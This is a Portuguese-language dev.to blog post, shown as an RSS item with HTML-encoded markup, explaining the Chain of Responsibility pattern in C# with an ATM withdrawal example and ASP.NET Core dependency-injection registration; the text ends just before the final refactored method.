      <pubDate>Mon, 22 Nov 2021 00:19:15 +0000</pubDate>
      <link>https://dev.to/wsantosdev/chain-of-responsibility-e-aspnet-core-14hn</link>
      <guid>https://dev.to/wsantosdev/chain-of-responsibility-e-aspnet-core-14hn</guid>
      <description>&lt;p&gt;Olá!&lt;/p&gt;

&lt;p&gt;Este é mais um post da seção &lt;strong&gt;Design&lt;/strong&gt;, e nele vamos tratar de um pattern bastante útil em cenários com múltiplas condições, o Chain of Responsibility (CoR, ou Cadeia de Responsabilidade, em tradução livre). Veremos também como integrá-lo ao container de injeção de dependência do ASP.Net Core.&lt;/p&gt;

&lt;p&gt;Vamos lá!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#o-problema"&gt;
  &lt;/a&gt;
  O Problema
&lt;/h2&gt;

&lt;p&gt;Antes de mais nada, precisamos entender qual a utilidade do pattern, ou seja, qual problema ele resolve. Patterns são soluções cabíveis para um dado tipo de problema, e com o CoR não é diferente.&lt;/p&gt;

&lt;p&gt;Imagine um cenário onde, para atender a uma dada requisição (ou comando) a satisfação de diversas condições seja necessária e que, para cada condição, pode haver um dado processamento específico a ser realizado ou um tipo de resultado a ser retornado.&lt;/p&gt;

&lt;p&gt;Soa estranho? Explico.&lt;/p&gt;

&lt;p&gt;Vamos imaginar um caixa eletrônico e sua função de saque. Para permitir o saque, o caixa eletrônico precisa validar se há saldo em conta disponível, se há o montante solicitado disponível no compartimento de notas, se há alguma limitação no valor do saque por horário etc.&lt;/p&gt;

&lt;p&gt;Uma implementação ingênua seria mais ou menos assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nf"&gt;Withdraw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Amount&lt;/span&gt; &lt;span class="p"&gt;==&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"Please fill a valid positive amount to withdraw."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;account&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;_accountRepository&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AccountNumber&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(!&lt;/span&gt;&lt;span class="n"&gt;account&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;HasAmount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Amount&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"There is not enough balance for this withdraw."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(!&lt;/span&gt;&lt;span class="n"&gt;_billStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;HasAmount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Amount&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"There aren't enough bills for this withdraw."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_withdrawRestrictionService&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;ShouldRestrictWithdraw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Amount&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DateTime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Now&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"The amount informed is greater than allowed at this time."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;_billStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Withdraw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Amount&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"Sucessful withdrawal."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Agora, você pode estar se perguntando: por quê está implementação é ingênua?&lt;/p&gt;

&lt;p&gt;Por dois motivos:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Quanto mais condições forem adicionadas à esta operação, maior o método vai se tornar.&lt;/li&gt;
&lt;li&gt;Quanto mais dependências forem necessárias para atender a estas condições, maior será a carga cognitiva para lidar com todas elas.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Vejamos a seguir como o CoR pode nos ajudar a lidar com estas questões.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#o-pattern"&gt;
  &lt;/a&gt;
  O Pattern
&lt;/h2&gt;

&lt;p&gt;O pattern sugere que, para cada condição a ser atendida para uma requisição ou comando, tenhamos um &lt;em&gt;handler&lt;/em&gt;, um tipo responsável por validá-la, e que este contenha uma referência a outro &lt;em&gt;handler&lt;/em&gt;, que será o próximo da cadeia, para encaminhar esta requisição caso não haja razão para interceptá-la e tratá-la.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Nota&lt;/strong&gt;: neste post, sugiro uma abordagem diferente da canônica para a aplicação do pattern. Um exemplo da abordagem canônica pode ser encontrado no &lt;a href="https://refactoring.guru/design-patterns/chain-of-responsibility/csharp/example"&gt;Refactoring Guru&lt;/a&gt; (em inglês).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como precisaremos de um &lt;em&gt;handler&lt;/em&gt; para cada condição, e todos estão sujeitos ao mesmo procedimento, ou seja, recebem a mesma requisição e retornam um mesmo tipo de resultado, podemos estabelecer um contrato que represente este comportamento. Vejamos abaixo:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;interface&lt;/span&gt; &lt;span class="nc"&gt;IHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TResult&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;bool&lt;/span&gt; &lt;span class="nf"&gt;ShouldHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;TResult&lt;/span&gt; &lt;span class="nf"&gt;Handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Aqui temos dois métodos: um que vai verificar se o &lt;em&gt;handler&lt;/em&gt; em questão deve interceptar a requisição recebida; e outro que manipula a requisição de fato, interceptando-a.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Nota&lt;/strong&gt;: uma abordagem alternativa é tornar os dois métodos assíncronos, em uma segunda interface chamada &lt;em&gt;IAsyncHandler&lt;/em&gt;, e por um bom motivo: nem sempre o que vai determinar se a requisição deve ou não ser interceptada depende da validação de seu próprio estado. Há situações onde uma operação, como um I/O, precisa acontecer para fazer esta verificação e, para estes casos, um método assíncrono é muito bem-vindo!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Com estes dois métodos, atendemos à primeira porção do pattern, que cada handler saiba se é responsável ou não por interceptar e tratar uma dada requisição e, em caso positivo, que a manipule em seguida.&lt;/p&gt;

&lt;p&gt;Agora precisamos atender à segunda porção, precisamos guardar uma referência para o próximo &lt;em&gt;handler&lt;/em&gt;, e garantir que todos os &lt;em&gt;handlers&lt;/em&gt; que implementarmos seguirão a mesma lógica de verificação e manipulação. Para isso, vamos usar uma classe abstrata que implementa nosso contrato:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;abstract&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HandlerBase&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TResponse&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;IHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TResponse&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;readonly&lt;/span&gt; &lt;span class="n"&gt;IHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TResponse&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;_next&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;HandlerBase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TResponse&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
        &lt;span class="n"&gt;_next&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;abstract&lt;/span&gt; &lt;span class="kt"&gt;bool&lt;/span&gt; &lt;span class="nf"&gt;ShouldHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="n"&gt;TResponse&lt;/span&gt; &lt;span class="nf"&gt;Handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;ShouldHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nf"&gt;HandleCore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;_next&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;protected&lt;/span&gt; &lt;span class="k"&gt;abstract&lt;/span&gt; &lt;span class="n"&gt;TResponse&lt;/span&gt; &lt;span class="nf"&gt;HandleCore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Agora temos garantido o seguinte comportamento: se a requisição puder ser manipulada pelo &lt;em&gt;handler&lt;/em&gt; atual, ela o será. Caso contrário, será encaminhada ao &lt;em&gt;handler&lt;/em&gt; seguinte.&lt;/p&gt;

&lt;p&gt;Com isso, podemos implementar um &lt;em&gt;handler&lt;/em&gt; para cada condição de nosso método de saque. Vamos a um exemplo:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;BillStorageHandler&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;HandlerBase&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;readonly&lt;/span&gt; &lt;span class="n"&gt;BillStorage&lt;/span&gt; &lt;span class="n"&gt;_billStorage&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;BillStorageHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WithdrawHandler&lt;/span&gt; &lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                              &lt;span class="n"&gt;BillStorage&lt;/span&gt; &lt;span class="n"&gt;billStorage&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;base&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="kt"&gt;bool&lt;/span&gt; &lt;span class="nf"&gt;ShouldHandle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
            &lt;span class="p"&gt;!&lt;/span&gt;&lt;span class="n"&gt;_billStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;HasAmount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Amount&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="k"&gt;protected&lt;/span&gt; &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt; &lt;span class="nf"&gt;HandleCore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
            &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Fail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"There aren't enough bills for this withdrawal."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;WithdrawHandler&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;HandlerBase&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;private&lt;/span&gt; &lt;span class="k"&gt;readonly&lt;/span&gt; &lt;span class="n"&gt;BillStorage&lt;/span&gt; &lt;span class="n"&gt;_billStorage&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;WithdrawHandler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BillStorage&lt;/span&gt; &lt;span class="n"&gt;billStorage&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;base&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
        &lt;span class="n"&gt;_billStorage&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;billStorage&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="kt"&gt;bool&lt;/span&gt; &lt;span class="n"&gt;ShouldHandle&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;protected&lt;/span&gt; &lt;span class="k"&gt;override&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt; &lt;span class="nf"&gt;HandleCore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;_billStorage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Withdraw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Amount&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;Ok&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Successful withdrawal."&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Repare em dois detalhes importantes na implementação acima: &lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;O &lt;em&gt;handler&lt;/em&gt; &lt;code&gt;BillStorageHandler&lt;/code&gt; recebe uma instância de &lt;code&gt;WithdrawHandler&lt;/code&gt; em seu construtor, e o guarda como o próximo da cadeia. Este é um detalhe importante porque injetar a interface &lt;code&gt;IHandler&amp;lt;TRequest, TResult&amp;gt;&lt;/code&gt;, ou a classe abstrata &lt;code&gt;HandlerBase&amp;lt;TRequest, TResult&amp;gt;&lt;/code&gt;, além de mais verboso, impede a identificação do próximo &lt;em&gt;handler&lt;/em&gt; da cadeia. Recebendo a especialização por injeção, fica mais claro qual é o próximo passo caso a requisição não deva ser manipulada por este &lt;em&gt;handler&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;O &lt;em&gt;handler&lt;/em&gt; &lt;code&gt;WithdrawalHandler&lt;/code&gt; informa &lt;code&gt;null&lt;/code&gt; como próximo &lt;em&gt;handler&lt;/em&gt; da cadeia, e sempre retorna &lt;code&gt;true&lt;/code&gt; em seu método &lt;code&gt;ShouldHandle&lt;/code&gt;. Isso acontece porque ele é o último nó da cadeia. Fixando o retorno &lt;code&gt;true&lt;/code&gt; em &lt;code&gt;ShouldHandle&lt;/code&gt; há a garantia de que a requisição sempre receberá um tratamento ao final da cadeia.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#inje%C3%A7%C3%A3o-de-depend%C3%AAncia"&gt;
  &lt;/a&gt;
  Injeção de Dependência
&lt;/h2&gt;

&lt;p&gt;Aqui precisamos falar sobre a abordagem canônica do &lt;em&gt;pattern&lt;/em&gt; e o motivo pelo qual ela foi evitada neste post. A abordagem canônica sugere que na interface &lt;code&gt;IHandler&amp;lt;TRequest, TResponse&amp;gt;&lt;/code&gt; haja um método chamado &lt;code&gt;SetNext&lt;/code&gt;, onde seria passada por parâmetro a instância do próximo &lt;em&gt;handler&lt;/em&gt;, permitindo assim a seguinte declaração:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="kt"&gt;var&lt;/span&gt; &lt;span class="n"&gt;billStorageHandler&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;BillStorageHandler&lt;/span&gt;&lt;span class="p"&gt;(...);&lt;/span&gt;
&lt;span class="n"&gt;billStorageHandler&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;SetNext&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;WithdrawHandler&lt;/span&gt;&lt;span class="p"&gt;(...));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;O problema com esta abordagem é que a inversão de controle é inviabilizada, e qualquer dependência de quaisquer dos &lt;em&gt;handlers&lt;/em&gt; precisariam ser instanciadas a priori de sua criação, impedindo os ganhos oferecidos pelo contêiner de injeção de dependência.&lt;/p&gt;

&lt;p&gt;Com a abordagem proposta neste post, a declaração se torna bastante simplificada, como o seguinte exemplo:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight csharp"&gt;&lt;code&gt;&lt;span class="k"&gt;public&lt;/span&gt; &lt;span class="k"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;ConfigureServices&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IServiceCollection&lt;/span&gt; &lt;span class="n"&gt;services&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;services&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddScoped&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;BillStorage&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;()&lt;/span&gt;
            &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddScoped&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;WithdrawalRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;WithdrawalResult&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;,&lt;/span&gt; &lt;span class="n"&gt;BillStorageHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;()&lt;/span&gt;
            &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddScoped&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;WithdrawalHandler&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Nota&lt;/strong&gt;: repare que ao registrar o &lt;em&gt;handler&lt;/em&gt; &lt;code&gt;BillStorageHandler&lt;/code&gt; foi informada a interface &lt;code&gt;IHandler&amp;lt;TRequest, TResult&amp;gt;&lt;/code&gt;. Essa declaração, opcional, é uma forma de anonimizar o primeiro &lt;em&gt;handler&lt;/em&gt; na classe onde a cadeia será invocada, se desejado. Desta forma, caso o primeiro &lt;em&gt;handler&lt;/em&gt; da cadeia precise ser substituído, não haverá a necessidade de se modificar a classe que consumirá a cadeia. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Com isso temos todas as nossas dependências registradas e podemos refatorar nosso método de saque:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
